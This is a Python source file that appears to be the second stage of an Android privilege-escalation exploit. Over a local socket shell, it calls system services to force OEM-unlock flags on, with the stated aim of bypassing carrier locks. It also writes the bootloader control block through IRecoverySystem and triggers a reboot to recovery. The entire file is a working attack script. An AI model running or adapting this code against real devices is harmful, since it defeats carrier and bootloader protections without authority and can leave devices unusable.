import socket
import codecs
import re
import shlex
from typing import Any
from io import BytesIO
from warnings import warn
from pathlib import Path

import aidl

from .exceptions import *
from .parcel import *


def swap_endianness(bytes_: bytes) -> bytes:
    result = b""
    bytes_io = BytesIO(bytes_)
    while True:
        read_bytes = bytes_io.read(4)
        if not read_bytes:
            break
        result += read_bytes[::-1]
    return result


def parse_service_result(service_result: str) -> bytes:
    EXPRESSION = re.compile(
        r"^(?:Result\: Parcel\(|  0x[0-9a-fA-F]+: )((?:[0-9a-fA-F ])+)'[^']*'\)?$"
    )
    matched_any = False
    result = b""
    for line in service_result.split("\n"):
        matched = EXPRESSION.fullmatch(line)
        if matched is None:
            continue
        matched_any = True
        result += codecs.decode(matched[1].replace(" ", ""), "hex")
    if not matched_any:
        raise ZygoteInjectionException("service call failed")
    return swap_endianness(result)


def parse_boolean_result(result: bytes) -> bool:
    status_code = int.from_bytes(result[:4], "little")
    if status_code:
        raise Exception("Service returned error status")
    number = int.from_bytes(result[4:8], "little")
    return bool(number)


# ----- Load AIDL definitions -----
with open(Path(__file__).parent / "IOemLockService.aidl") as f:
    oem_lock_aidl = f.read()
oem_lock_service = parse_aidl_interface(
    aidl.fromstring(oem_lock_aidl), "IOemLockService"
)

with open(Path(__file__).parent / "IRecoverySystem.aidl") as f:
    recovery_aidl = f.read()
recovery_service = parse_aidl_interface(
    aidl.fromstring(recovery_aidl), "IRecoverySystem"
)

known_services = {
    "oem_lock": oem_lock_service,
    "recovery": recovery_service,
}


class Stage2Exploit:
    def __init__(self, port: int = 1234) -> None:
        self.port = port

    def call_service(
        self,
        device_socket: socket.SocketType,
        service_name: str,
        function: str,
        *arguments: ParcelType
    ) -> Any:
        interface = known_services[service_name]
        service_function = interface[function]
        parsed_arguments = service_function.parse_arguments(arguments)

        command_parameters = [
            "service",
            "call",
            service_name,
            str(service_function.code),
            *parsed_arguments,
        ]
        command = shlex.join(command_parameters) + "\n"
        device_socket.sendall(command.encode("utf-8"))
        service_result = device_socket.recv(10000).decode("utf-8")

        return_value = parse_service_result(service_result)
        parsed_return_value = service_function.parse_return(return_value)
        status_code = parsed_return_value[0]

        formatted_arguments = ", ".join(repr(argument) for argument in arguments)
        formatted_service_call = f"{function}({formatted_arguments})"
        if status_code:
            raise ZygoteInjectionException(
                f"service call {formatted_service_call} returned error {status_code:d}"
            )
        if parsed_return_value[1:]:
            print(
                f"service call {formatted_service_call} = {repr(parsed_return_value[1])}"
            )
        else:
            print(f"service call {formatted_service_call}")
        try:
            return parsed_return_value[1]
        except IndexError:
            return None

    def exploit_stage2(self):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as device_socket:
            device_socket.connect(("127.0.0.1", self.port))
            device_socket.sendall(b"\n")

            # ----- OEM unlock -----
            print("=== OEM Unlock ===")
            allowed_by_carrier = self.call_service(
                device_socket, "oem_lock", "isOemUnlockAllowedByCarrier"
            )
            oem_unlock_allowed = self.call_service(
                device_socket, "oem_lock", "isOemUnlockAllowed"
            )
            if not allowed_by_carrier:
                print("OEM unlock is blocked by carrier, attempting to remove carrier lock")
                self.call_service(
                    device_socket, "oem_lock", "setOemUnlockAllowedByCarrier", 1
                )
                if self.call_service(
                    device_socket, "oem_lock", "isOemUnlockAllowedByCarrier"
                ):
                    message = "CARRIER OEM UNLOCK BYPASSED"
                    print("*" * (len(message) + 4))
                    print(f"* {message} *")
                    print("*" * (len(message) + 4))
                    print("This means you MIGHT be able to root your device!")
                    print('Enable OEM unlock in settings and attempt to unlock the bootloader via "fastboot oem unlock"')
                    print("This may or may not work depending on your device model")
                else:
                    print("Could not bypass carrier OEM unlock")
            if not self.call_service(
                device_socket, "oem_lock", "isOemUnlockAllowedByUser"
            ):
                self.call_service(
                    device_socket, "oem_lock", "setOemUnlockAllowedByUser", 1
                )
                if not self.call_service(
                    device_socket, "oem_lock", "isOemUnlockAllowedByUser"
                ):
                    print("Could not change user OEM unlock, please enable it in developer options")
            if not oem_unlock_allowed and self.call_service(
                device_socket, "oem_lock", "isOemUnlockAllowed"
            ):
                print("OEM unlock is now allowed!")
            if self.call_service(device_socket, "oem_lock", "isDeviceOemUnlocked"):
                print('Your bootloader seems to be unlocked, try running "fastboot flashing ..."')

            # ----- BCB write via IRecoverySystem -----
            print("\n=== BCB Write via IRecoverySystem.setupBcb ===")

            # Try multiple commands
            commands = [
                "bootonce-bootloader",
                "reboot-bootloader",
                "bootloader",
                "fastboot"
            ]
            for cmd in commands:
                try:
                    result = self.call_service(
                        device_socket,
                        "recovery",
                        "setupBcb",
                        cmd
                    )
                    if result is True:
                        print(f"[+] setupBcb('{cmd}') SUCCESS (BCB written)")
                    elif result is False:
                        print(f"[-] setupBcb('{cmd}') returned False (write failed)")
                    else:
                        print(f"[?] setupBcb('{cmd}') returned {result}")
                except Exception as e:
                    print(f"[!] setupBcb('{cmd}') failed: {e}")

            # Also try clearBcb to see if we have access
            print("\n=== Trying clearBcb ===")
            try:
                result = self.call_service(device_socket, "recovery", "clearBcb")
                if result is True:
                    print("[+] clearBcb succeeded (BCB cleared)")
                else:
                    print(f"[-] clearBcb returned {result}")
            except Exception as e:
                print(f"[!] clearBcb failed: {e}")

            # Finally, try rebootRecoveryWithCommand (dangerous!)
            print("\n=== Trying rebootRecoveryWithCommand (device will reboot to recovery if successful) ===")
            try:
                self.call_service(
                    device_socket,
                    "recovery",
                    "rebootRecoveryWithCommand",
                    "--bootonce-bootloader"
                )
                print("[+] rebootRecoveryWithCommand accepted (device should reboot to recovery)")
            except Exception as e:
                print(f"[!] rebootRecoveryWithCommand failed: {e}")


if __name__ == "__main__":
    Stage2Exploit().exploit_stage2()
